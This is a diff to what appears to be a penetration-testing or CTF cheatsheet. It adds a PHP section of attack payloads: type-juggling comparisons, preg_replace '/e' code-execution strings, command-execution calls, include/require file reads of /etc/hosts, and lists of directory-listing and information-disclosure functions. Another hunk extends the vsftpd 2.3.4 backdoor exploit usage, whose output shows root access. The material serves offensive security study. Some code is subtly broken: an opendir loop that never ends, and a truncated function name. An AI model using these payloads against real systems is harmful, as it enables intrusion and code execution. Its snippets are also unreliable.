@@ -1426,6 +1426,175 @@ node {
 }
 ```
 
+### PHP
+
+```bash
+====Comparisons====
+var_dump(0 == "a"); // 0 == 0 -> true
+var_dump("1" == "01"); // 1 == 1 -> true
+var_dump("10" == "1e1"); // 10 == 10 -> true
+var_dump(100 == "1e2"); // 100 == 100 -> true
+var_dump(.0 == "00"); // 0 == 0
+
+====is_numeric()====
+is_numeric(" \t\r\n 123") => true
+is_numeric(' 87') => true
+is_numeric('87 ') => false
+is_numeric(' 87 ') => false
+is_numeric('0xdeadbeef')
+
+# Returns True
+' -.0'
+'0.'
+' +2.1e5'
+' -1.5E+25'
+'1.e5'
+'9e9'
+
+====preg_replace()====
+#Example1
+preg_replace('/a/e', 'sYstEm(ls)', 'aaaa');
+
+#Example2
+preg_replace('/a/e', '$output = `cat flag.txt`; echo "<pre>$output</pre>";', 'aaaa');
+
+#Example3
+preg_replace('/a/e', 'sYstEm("ls")', 'aaaa');
+
+====Command Execution====
+#exec()
+exec("whoami");
+
+#passthru()
+passthru("whoami");
+
+#system()
+system("whoami");
+
+#shell_exec()
+shell_exec("whoami");
+
+#backticks (use shell_exec)
+`whoami`;
+
+#popen()
+popen("whoami","r");
+
+#proc_open()
+proc_open("whoami");
+
+#pcntl_exec    
+pcntl_exec("whoami");
+
+====Read Files====
+#readfile()
+readfile("/etc/hosts");
+
+#file_get_contents()
+file_get_contents("/etc/hosts");
+
+#fopen()/fread()
+fread(fopen("/etc/hosts","r"),filesize("/etc/hosts"));
+
+#include_once();
+include_once('/etc/hosts');
+
+#include();
+include('/etc/hosts');
+
+#require_once()
+require_once('/etc/hosts');
+
+#require()
+require('/etc/hosts');
+
+====List Files/Directories====
+#opendir()
+
+<?php 
+
+$dir = "/etc/";
+
+// Open a known directory, and proceed to read its contents
+if (is_dir($dir)) {
+    if ($dh = opendir($dir)) {
+        while (($file = readdir($dh)) !== true) {
+            echo "filename: $file : filetype: " . filetype($dir . $file) . "\n";
+        }
+        closedir($dh);
+    }
+}
+
+?>
+
+#scandir()
+
+<?php
+$dir    = '/etc';
+$files1 = scandir($dir);
+$files2 = scandir($dir, 1);
+
+print_r($files1);
+print_r($files2);
+?>
+
+#Readdir()
+
+<?php
+
+if ($handle = opendir('/etc')) {
+    echo "Directory handle: $handle\n";
+    echo "Entries:\n";
+
+    /* This is the correct way to loop over the directory. */
+    while (false !== ($entry = readdir($handle))) {
+        echo "$entry\n";
+    }
+
+    /* This is the WRONG way to loop over the directory. */
+    while ($entry = readdir($handle)) {
+        echo "$entry\n";
+    }
+
+    closedir($handle);
+}
+?>
+
+#Glob()
+
+<?php
+foreach (glob("/etc/*.txt") as $filename) {
+    echo "$filename size " . filesize($filename) . "\n";
+}
+?>
+
+#Information Disclosure
+phpinfo
+posix_mkfifo
+posix_getlogin
+posix_ttyname
+getenv
+get_current_user
+proc_get_status
+get_cfg_var
+disk_free_space
+disk_total_space
+diskfreespace
+getcwd
+getlastmo
+getmygid
+getmyinode
+getmypid
+getmyuid
+
+
+# References
+- https://github.com/w181496/Web-CTF-Cheatsheet
+- https://stackoverflow.com/questions/3115559/exploitable-php-functions
+- https://wiki.x10sec.org/web/php/php/
+
+```
+
 # C. SUID/CAP/SUDO/GROUP
 
 ### LXD
@@ -1837,6 +2006,9 @@ gcc -Wall --std=gnu99 -s poc.c -o ptrace_traceme_root
 # Download
 wget https://raw.githubusercontent.com/ahervias77/vsftpd-2.3.4-exploit/master/vsftpd_234_exploit.py
 
+# Manually
+ftp 10.10.10.10
+
 # Usage
 └─▶ python3 vsftpd_234_exploit.py 10.150.150.12 21 whoami
 [*] Attempting to trigger backdoor...
@@ -1845,6 +2017,9 @@ wget https://raw.githubusercontent.com/ahervias77/vsftpd-2.3.4-exploit/master/vs
 [+] Connected to backdoor on 10.150.150.12:6200
 [+] Response:
 root
+
+# References
+- https://www.programmersought.com/article/18706301160/
 ```
 
 ### Shadow Writable
